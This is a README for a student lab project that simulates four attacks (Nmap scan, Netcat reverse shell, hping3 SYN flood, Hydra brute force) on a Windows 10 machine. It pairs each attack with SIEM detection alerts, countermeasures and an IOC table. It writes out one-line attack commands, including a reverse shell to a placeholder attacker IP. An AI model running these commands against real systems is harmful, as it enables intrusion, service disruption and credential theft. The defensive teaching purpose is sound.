# Cybersecurity Attack Simulations (SEC320 Group Project)

This project demonstrates four simulated cyber attacks performed in a controlled lab environment as part of **SEC320 (Incident Response & Security Operations)** at Seneca Polytechnic. Each attack was executed on a Windows 10 victim machine from a Kali Linux attacker and detected using **AlienVault OSSIM (SIEM)**.

## 👥 Team Members
- Md Jonayed Hossain (130870231)  
- Gazi Mohd Mazdi (169977238)  
- Nur Mohammed Rasel (153510235)  
- Md Zasim Hossain (155153224)  

## ✨ Attacks Simulated
### 🔍 A1. Active OS Fingerprinting (Nmap)
- **Tool:** Nmap (`sudo nmap -A -T4 <target>`)  
- **Goal:** Identify OS and open services on a Windows 10 system.  
- **Detection:** OSSIM detected aggressive Nmap scanning (`ET SCAN Nmap`).  
- **Countermeasures:** IDS rules, firewall hardening, service banner obfuscation, honeypots.

---

### 🖥️ A2. Unauthorized Access (Netcat Reverse Shell)
- **Tool:** Netcat (`nc.exe <attacker_IP> 4444 -e cmd.exe`)  
- **Goal:** Gain a reverse shell from Windows → Kali.  
- **Outcome:** Attacker gained shell access and created a backdoor admin user.  
- **Detection:** OSSIM Snort alert (`ET ATTACK_RESPONSE Net User Command Response`).  
- **Countermeasures:** Application whitelisting, EDR, firewall rules, SIEM monitoring.

---

### 🌐 A3. (D)DoS Attack – SYN Flood
- **Tool:** hping3 (`sudo hping3 -S --flood -p 445 <target_IP>`)  
- **Goal:** Overwhelm Windows TCP stack by flooding SYN packets on port 445.  
- **Detection:** OSSIM alert (`ET SCAN Behavioral Unusual Port 445 traffic`).  
- **Countermeasures:** Enable SynAttackProtect in Windows registry, rate limiting, DDoS protection services.

---

### 🔑 A4. Brute Force Attack (Hydra)
- **Tool:** Hydra (`hydra -l admin -P rockyou.txt <target_IP> http-post-form ...`)  
- **Goal:** Crack weak DVWA login credentials through repeated attempts.  
- **Detection:** OSSIM (via OSSEC logs) flagged multiple authentication failures.  
- **Countermeasures:** Account lockout policies, rate limiting, MFA, stronger passwords, WAF rules.

---

## 📊 Indicators of Compromise (IOCs)
| ID | Attack               | IOC/Log Event                                      | Source IP       | Destination IP | Service/Port | Severity |
|----|----------------------|----------------------------------------------------|-----------------|----------------|--------------|----------|
| A1 | Nmap OS Scan         | `OSSIM: Nmap OS Scan Detected`                     | 192.168.116.130 | 192.168.116.129| 80, 443, 3306| Medium   |
| A2 | Netcat Reverse Shell | `OSSIM: ET ATTACK_RESPONSE Net User Command`       | 192.168.153.129 | 192.168.153.135| 4444         | High     |
| A3 | SYN Flood Attack     | `OSSIM: ET SCAN Unusual Port 445 Traffic`          | 192.168.155.129 | 192.168.155.128| 445/TCP      | Low      |
| A4 | Hydra Brute Force    | `OSSIM: User Authentication Failure (OSSEC logs)`  | 192.168.100.128 | 192.168.100.129| 80/HTTP      | Low      |

---

## 📖 Learning Outcomes
- Hands-on practice simulating real-world cyber attacks in a safe lab.
- Experience with **OSSIM SIEM** to detect reconnaissance, intrusion, DoS, and brute-force activity.
- Understanding of **countermeasures** and **incident response** workflows.
- Team collaboration on documenting and presenting security incidents.

## 👤 Author Contributions
- **Md Jonayed Hossain** → Nmap OS Fingerprinting  
- **Nur Mohammed Rasel** → Netcat Reverse Shell  
- **Md Zasim Hossain** → SYN Flood (hping3)  
- **Gazi Mohd Mazdi** → Brute Force Attack (Hydra)  

---

## 📄 License
This project is released under the MIT License. See [LICENSE](LICENSE) for details.
